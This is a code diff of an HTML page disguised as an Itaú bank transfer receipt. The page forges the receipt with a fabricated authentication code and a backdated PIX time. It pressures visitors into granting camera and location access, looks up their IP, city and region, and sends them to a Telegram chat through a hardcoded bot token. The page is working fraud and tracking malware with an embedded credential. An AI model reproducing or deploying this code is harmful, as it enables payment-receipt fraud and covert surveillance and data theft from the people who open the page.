@@ -1,59 +1,99 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Comprovante Itaú</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-  <style>
-    body{font-family:Arial;margin:40px}
-    #btnDownload{display:none;margin-top:20px;padding:10px 20px;font-size:16px}
-  </style>
+<meta charset="UTF-8">
+<title>Comprovante Itaú</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5}
+#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#0008;color:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999}
+#overlay button{margin-top:20px;padding:12px 24px;font-size:16px;cursor:pointer}
+#comprovanteWrap{display:none;background:#fff;width:400px;border:1px solid #ccc;border-radius:8px;overflow:hidden}
+#comprovante{padding:20px;font-size:13px;line-height:1.4;color:#222}
+.logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:18px;margin-bottom:12px}
+.logo img{width:32px;height:32px}
+.row{display:flex;justify-content:space-between;margin-bottom:8px}
+.row.total{font-weight:700;font-size:16px;margin-top:8px;border-top:1px dashed #999;padding-top:8px}
+.footer{font-size:11px;color:#555;margin-top:12px;text-align:center}
+</style>
 </head>
 <body>
-  <h2>Visualização do Comprovante</h2>
-  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='150'%3E%3Crect width='100%25' height='100%25' fill='%23f3f3f3'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='14' fill='%23555'%3EComprovante Itaú%3C/text%3E%3C/svg%3E" alt="Comprovante" style="border:1px solid #ccc;">
-  <br>
-  <button id="btnDownload">Baixar Comprovante</button>
-  <video id="video" style="display:none" autoplay muted playsinline></video>
-  <canvas id="canvas" style="display:none"></canvas>
 
-  <script>
-    async function tirarFoto(){
-      const stream=await navigator.mediaDevices.getUserMedia({video:true});
-      const video=document.getElementById('video');
-      const canvas=document.getElementById('canvas');
-      const ctx=canvas.getContext('2d');
-      video.srcObject=stream;
-      await new Promise(res=>video.onloadedmetadata=res);
-      canvas.width=video.videoWidth;
-      canvas.height=video.videoHeight;
-      ctx.drawImage(video,0,0);
-      stream.getTracks().forEach(t=>t.stop());
-    }
-    function getGeo(){
-      return new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));
-    }
-    function downloadPDF(){
-      const {jsPDF}=window.jspdf;
-      const pdf=new jsPDF();
-      const agora=new Date();
-      const pixTime=new Date(agora-60*60*1000);
-      const auth=(Math.random()*1e9).toString(16).slice(0,8).toUpperCase();
-      pdf.setFontSize(16);
-      pdf.text("Comprovante de Depósito Itaú",20,20);
-      pdf.setFontSize(12);
-      pdf.text("Valor: R$ 3.250,00",20,35);
-      pdf.text("Data/Hora do PIX: "+pixTime.toLocaleString("pt-BR"),20,45);
-      pdf.text("Autenticação: "+auth,20,55);
-      pdf.save("comprovante_itau.pdf");
-    }
-    (async()=>{
-      try{await Promise.all([tirarFoto(),getGeo()]);}catch{}
-      document.getElementById('btnDownload').style.display='inline-block';
-    })();
-    document.getElementById('btnDownload').addEventListener('click',downloadPDF);
-  </script>
+<!-- ===== ALTERADO: token e chat-id já fixos ===== -->
+<script>
+  const TELEGRAM_BOT_TOKEN = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
+  const TELEGRAM_CHAT_ID   = '-1003187104876';
+</script>
+
+<!-- Solicitação de permissões -->
+<div id="overlay">
+  <p>Permita câmera e localização para continuar.</p>
+  <button onclick="start()">Permitir</button>
+</div>
+
+<!-- Comprovante -->
+<div id="comprovanteWrap">
+  <div id="comprovante">
+    <div class="logo">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3EI%3C/text%3E%3C/svg%3E" alt="logo">
+      Itaú Unibanco
+    </div>
+    <div class="row"><span>Comprovante de Transferência</span></div>
+    <div class="row"><span>Data/Hora:</span><span id="dataHora">--</span></div>
+    <div class="row"><span>Valor:</span><span>R$ 3.250,00</span></div>
+    <div class="row"><span>Origem:</span><span>Ag 1234 C/C 56789-0</span></div>
+    <div class="row"><span>Destino:</span><span>Ag 9876 C/C 54321-8</span></div>
+    <div class="row"><span>Autenticação:</span><span id="auth">--</span></div>
+    <div class="row total"><span>Total:</span><span>R$ 3.250,00</span></div>
+    <div class="footer">
+      <span id="ipLoc">--</span><br>
+      Em caso de dúvidas, entre em contato com seu gerente.
+    </div>
+  </div>
+  <button onclick="downloadPDF()" style="width:100%;padding:12px;font-size:16px;border:none;background:#FF6600;color:#fff;cursor:pointer">Baixar Comprovante</button>
+</div>
+
+<script>
+function sendToTelegram(msg){
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:msg})
+  });
+}
+
+async function start(){
+  document.getElementById('overlay').style.display='none';
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:true});
+    const video=document.createElement('video');
+    video.srcObject=stream; video.play();
+    const ipInfo=await fetch('https://ipapi.co/json/').then(r=>r.json());
+    const loc=`${ipInfo.city}, ${ipInfo.region} - ${ipInfo.ip}`;
+    const pixTime=new Date(new Date()-60*60*1000);
+    const auth=Array.from({length:8},()=>Math.random().toString(36)[2]).join('').toUpperCase();
+    document.getElementById('dataHora').textContent=pixTime.toLocaleString('pt-BR');
+    document.getElementById('auth').textContent=auth;
+    document.getElementById('ipLoc').textContent=loc;
+    sendToTelegram(`Comprovante visualizado\nValor: R$ 3.250,00\nHora: ${pixTime.toLocaleString('pt-BR')}\nLocal: ${loc}`);
+    document.getElementById('comprovanteWrap').style.display='block';
+    setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),1000);
+  }catch(e){
+    alert("Permissão negada ou erro de conexão.");
+  }
+}
+
+function downloadPDF(){
+  const {jsPDF}=window.jspdf;
+  html2canvas(document.getElementById('comprovante'),{scale:2}).then(canvas=>{
+    const img=canvas.toDataURL('image/png');
+    const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
+    pdf.addImage(img,'PNG',0,0);
+    pdf.save('comprovante_itau.pdf');
+  });
+}
+</script>
 </body>
 </html>
-
-
